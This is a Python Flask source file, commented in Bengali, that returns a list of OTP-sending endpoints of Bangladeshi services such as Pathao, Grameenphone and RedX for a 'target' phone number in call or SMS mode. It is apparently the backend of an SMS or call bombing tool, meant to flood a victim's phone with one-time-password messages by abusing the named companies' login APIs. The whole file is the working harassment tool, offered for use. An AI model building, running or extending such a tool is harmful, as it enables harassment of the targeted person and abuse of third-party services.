from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/get_apis', methods=['GET'])
def get_apis():
    target = request.args.get('target', '')
    mode = request.args.get('mode', '') # call / sms
    
    if not target:
        return jsonify({"status": "error", "message": "Missing target"}), 400

    api_list = []
    
    # নম্বর ফরম্যাটিং
    clean_num = target.replace("+88", "").replace("+", "") # 017...
    if clean_num.startswith("880"): clean_num = clean_num[2:] # 017...
    raw_num = clean_num[1:] if clean_num.startswith("0") else clean_num # 17...

    # --- বাংলাদেশ এপিআই লিস্ট (আপনার পাঠানো এপিআইসহ) ---
    if target.startswith("+880"):
        if mode == "call":
            # কলের জন্য নির্দিষ্ট এপিআই (রেডক্স ব্যবহার করা হয়েছে কারণ এটি কল দেয়)
            api_list = [
                {"method": "POST", "url": "https://api-gateway.redx.com.bd/customer-v1/send-otp", "data": {"phone": clean_num, "intent": "LOGIN"}},
            ]
        else:
            # আপনি যেগুলো দিয়েছেন + কিছু এক্সট্রা এসএমএস এপিআই
            api_list = [
                # ১. OsudPotro
                {"method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "data": {"mobile": "+88-"+clean_num, "deviceToken": "app", "language": "bn", "os": "android"}},
                
                # ২. GP Website
                {"method": "POST", "url": "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", "data": {"msisdn": clean_num}},
                
                # ৩. Cinematic
                {"method": "POST", "url": f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{clean_num}/", "data": {}},
                
                # ৪. Meena Bazar
                {"method": "POST", "url": f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={clean_num}&type=login", "data": {}},
                
                # ৫. Pathao
                {"method": "POST", "url": "https://api.pathao.com/v1/auth/otp/send", "data": {"phone": clean_num, "reason": "login"}},
            ]

    return jsonify({
        "status": "success",
        "total": len(api_list),
        "apis": api_list
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
